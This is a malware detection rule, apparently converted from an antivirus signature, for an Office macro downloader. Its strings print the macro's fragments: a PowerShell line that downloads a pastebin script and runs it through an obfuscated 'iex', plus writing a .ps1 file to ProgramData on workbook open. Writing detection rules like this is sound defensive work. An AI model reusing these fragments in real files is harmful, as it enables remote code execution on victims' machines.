
rule TrojanDownloader_O97M_EncDoc_RVL_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.RVL!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {2e 57 72 69 74 65 20 28 22 28 4e 65 77 2d 4f 62 6a 65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 53 74 72 69 6e 67 28 27 68 74 74 70 73 3a 2f 2f 70 61 73 74 65 62 69 6e 2e 63 6f 6d 2f 72 61 77 2f 57 4e 4a 44 35 58 52 76 27 29 7c 2e 28 20 28 5b 53 74 72 69 6e 67 5d 27 27 2e 49 73 4e 6f 72 6d 61 6c 69 7a 65 64 29 5b 35 2c 33 36 2c 34 38 5d 2d 4a 6f 69 6e 27 27 29 22 29 } //1 .Write ("(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/WNJD5XRv')|.( ([String]''.IsNormalized)[5,36,48]-Join'')")
		$a_01_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 63 72 69 70 74 69 6e 67 2e 46 69 6c 65 53 79 73 74 65 6d 4f 62 6a 65 63 74 22 29 } //1 = CreateObject("Scripting.FileSystemObject")
		$a_01_2 = {6f 62 6a 46 53 4f 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 43 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 6f 6b 2e 70 73 31 22 29 } //1 objFSO.CreateTextFile("C:\programdata\ok.ps1")
		$a_01_3 = {77 6f 72 6b 62 6f 6f 6b 5f 6f 70 65 6e 28 29 } //1 workbook_open()
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}